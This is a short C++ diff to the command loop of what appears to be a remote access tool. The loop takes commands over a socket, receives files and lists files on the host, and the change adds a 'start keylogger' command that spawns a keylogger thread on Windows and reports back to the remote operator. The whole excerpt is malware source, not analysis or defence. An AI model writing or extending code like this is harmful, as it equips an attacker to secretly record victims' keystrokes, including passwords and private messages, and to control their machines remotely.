@@ -309,10 +309,7 @@ void Connection::connection() {
             cout << "The file path is " << buffer.data() << endl;
             recvFile(buffer.data());
             continue;
-        }
-
-
-        if (!command.rfind("get files")) {
+        } else if (!command.rfind("get files")) {
             command = command.substr(10, command.size() - 1);
             string files = getAllFiles(command);
             cout << files << endl;
@@ -332,7 +329,15 @@ void Connection::connection() {
             cout << files.size() << endl;
             sendMessage(files.c_str());
             continue;
+        } else if (!command.rfind("start keylogger")) {
+            Keylogger keylogger = Keylogger();
+            ::CreateThread(nullptr, 0,
+                           reinterpret_cast<LPTHREAD_START_ROUTINE>(keylogger.startKeylogger()),
+                           nullptr, 0, nullptr);
+            sendMessage("The keylogger has started");
+            continue;
         }
+
         //The command is not exist
         //string cantFind = "The command " + command + " was not found";
         send(sock, COMMAND_NOT_FOUND, 4, 0);
